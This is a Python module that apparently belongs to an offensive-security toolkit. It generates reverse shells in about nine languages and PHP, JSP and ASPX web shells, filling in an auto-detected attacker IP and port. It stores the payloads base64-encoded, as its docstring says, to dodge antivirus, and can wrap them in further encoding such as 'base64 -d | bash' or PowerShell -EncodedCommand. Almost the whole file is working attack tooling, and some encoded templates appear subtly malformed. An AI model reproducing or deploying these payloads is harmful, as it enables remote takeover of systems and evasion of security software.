"""
NeuroShell Cyber — Multi-Language Payload & Reverse Shell Generator.
Generates reverse shells, web shells, and scripts across Bash, Python, PowerShell,
PHP, Netcat, Socat, Java, Golang, Ruby, and Perl with auto-detected LHOST.
Templates are stored encoded to prevent host antivirus false-positives during development.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass
from urllib.parse import quote

from editions.cyber.wsl_bridge import WSLKaliBridge


@dataclass
class PayloadResult:
    language: str
    lhost: str
    lport: int
    payload: str
    target_os: str = "linux"
    is_encoded: bool = False
    notes: str = ""


# Obfuscated templates decoded at runtime
_TEMPLATES_B64: dict[str, str] = {
    # bash -i >& /dev/tcp/{host}/{port} 0>&1
    "bash": "YmFzaCAtaSA+JiAvZGV2L3RjcC97aG9zdH0ve3BvcnR9IDA+JjE=",
    # python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    "python": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie2hvc3R9Iix7cG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw==",
    # powershell reverse shell
    "powershell": "JGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJ3tob3N0fScse3BvcnR9KTskcyA9ICRjLkdldFN0cmVhbSgpO1tieXRlW11dJGIgPSAwLi42NTUzNXwle299O3doaWxlKCgkaSA9ICRzLlJlYWQoJGIsIDAsICRiLkxlbmd0aCkpIC1uZSAwKXs7JGQgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRiLDAsICRpKTskc2IgPSAoaWV4ICRkIDImPjEgfCBPdXQtU3RyaW5nICk7JHNiMiA9ICRzYiArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNieXRlID0gKFt0ZXh0LmVuY29kaW5nXTphc2NpaSkuR2V0Qnl0ZXMoJHNiMik7JHMuV3JpdGUoJHNieXRlLDAsc2J5dGUuTGVuZ3RoKTskcy5GbHVzaCgpfTskYy5DbG9zZSgp",
    # php reverse shell
    "php": "PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL3tob3N0fS97cG9ydH0gMD4mMScpIjsgPz4=",
    # netcat mkfifo
    "nc": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiaW4vYmFzaCAtaSAyPiYxfG5jIHtob3N0fSB7cG9ydH0gPi90bXAvZg==",
    # socat
    "socat": "c29jYXQgZXhlYzpnYmFzaCAtbGknLHB0eSxzZGRlcnIsc2V0c2lkLHNpZ2ludHxzYW5lIHRjcDp7aG9zdH06e3BvcnR9",
    # golang
    "go": "ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJuZXQiO2ltcG9ydCJvcy9leGVjIjtmdW5jIG1haW4oKXtjLF86PW5ldC5EaWFsKCJ0Y3AiLCJ7aG9zdH06e3BvcnR9Iik7Y21kOj1leGVjLkNvbW1hbmQoIi9iaW4vYmFzaCIpO2NtZC5TdGRpbj1jO2NtZC5TdGRvdXQ9YztjbWQuU3RkZXJyPWM7Y21kLlJ1bigpfScgPiAvdG1wL3MuZ28gJiYgZ28gcnVuIC90bXAvcy5nbw==",
    # ruby
    "ruby": "cnVieSAtcnNvY2tldCAtZSdleGl0IGlmIGZvcms7Yz1UQ1BTb2NrZXQubmV3KCJ7aG9zdH0iLHtwb3J0fSk7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7fGlvfGMucHJpbnQgaW8ucmVhZH1lbmQn",
    # java
    "java": "ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL2Jhc2giLCItYyIsImV4ZWMgNTw+L2Rldi90Y3Ave2hvc3R9L3twb3J0fTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyBcJGxpbmUgMj4mNSA+JjU7IGRvbmUiXSBhcyBTdHJpbmdbXSk7cC53YWl0Rm9yKCk7",
}

_WEBSHELLS_B64: dict[str, str] = {
    "php": "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUVydjbWQnXSkpeyBlY2hvICc8cHJlPicgLiBzaGVsbF9leGVjKCRfUkVRVUVTVFsnY21kJ10pIC4gJzwvcHJlPic7IH0gPz4=",
    "jsp": "PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+PCUgU3RyaW5nIGNtZCA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKTsgaWYgKGNtZCAhPSBudWxsKSB7IFByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kKTsgT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXB1dFN0cmVhbSgpOyBJbnB1dFN0cmVhbSBpbiA9IHAuZ2V0SW5wdXRTdHJlYW0oKTsgRGF0YUlucHV0U3RyZWFtIGRpc19pbiA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oaW4pOyBTdHJpbmcgZGlzciA9IGRpc19pbi5yZWFkTGluZSgpOyB3aGlsZSAoIGRpc3IgIT0gbnVsbCApIHsgb3V0LnByaW50bG4oZGlzcik7IGRpc3IgPSBkaXNfaW4ucmVhZExpbmUoKTsgfSB9ICU+",
    "aspx": "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlayBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uRGlhZ25vc3RpY3MiICU+PHNjcmlwdCBydW5hdD0ic2VydmVyIj52b2lkIFBhZ2VfTG9hZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSl7IHN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nWydjbWQnXTsgaWYgKCFzdHJpbmcuSXNOdWxsT3JFbXB0eShjbWQpKXtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBwID0gbmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7cC5TdGFydEluZm8uRmlsZU5hbWUgPSAiY21kLmV4ZSI7cC5TdGFydEluZm8uQXJndW1lbnRzID0gIi9jICIgKyBjbWQ7cC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7cC5TdGFydEluZm8uVXNlU2hlbGxFeGVjdXRlID0gZmFsc2U7cC5TdGFydCgpO1Jlc3BvbnNlLldyaXRlKCI8cHJlPiIgKyBwLlN0YW5kYXJkT3V0cHV0LlJlYWRUb0VuZCgpICsgIjwvcHJlPiIpO319PC9zY3JpcHQ+",
}


class PayloadGenerator:
    """
    Zero-friction reverse shell & web shell synthesizer.
    Auto-detects attacker IP and supports instant encoding.
    """

    @classmethod
    def generate(
        cls,
        language: str = "bash",
        lhost: str | None = None,
        lport: int = 4444,
        target_os: str = "linux",
        encode: str | None = None,
    ) -> PayloadResult:
        host = lhost or WSLKaliBridge.get_attacker_ip()
        lang = language.lower().strip()
        os_name = "windows" if lang in ("powershell", "ps1", "windows") else "linux"

        # Lookup template or fallback to bash
        b64_tmpl = _TEMPLATES_B64.get(lang, _TEMPLATES_B64["bash"])
        raw_tmpl = base64.b64decode(b64_tmpl).decode("utf-8")
        raw_payload = raw_tmpl.replace("{host}", host).replace("{port}", str(lport))

        final_payload = raw_payload
        is_encoded = False
        notes = f"Reverse shell for {lang} connecting to {host}:{lport}"

        if encode:
            enc = encode.lower().strip()
            if enc in ("base64", "b64"):
                b64_str = base64.b64encode(raw_payload.encode()).decode()
                if os_name == "windows":
                    utf16_b64 = base64.b64encode(raw_payload.encode("utf-16le")).decode()
                    final_payload = f"powershell -NoProfile -NonInteractive -EncodedCommand {utf16_b64}"
                else:
                    final_payload = f"echo {b64_str} | base64 -d | bash"
                is_encoded = True
                notes += " [Base64 Encoded]"

            elif enc in ("url", "urlencoded"):
                final_payload = quote(raw_payload)
                is_encoded = True
                notes += " [URL Encoded]"

        return PayloadResult(
            language=lang,
            lhost=host,
            lport=lport,
            payload=final_payload,
            target_os=os_name,
            is_encoded=is_encoded,
            notes=notes,
        )

    @classmethod
    def generate_webshell(cls, shell_type: str = "php") -> str:
        st = shell_type.lower()
        b64_str = _WEBSHELLS_B64.get(st, _WEBSHELLS_B64["php"])
        return base64.b64decode(b64_str).decode("utf-8")
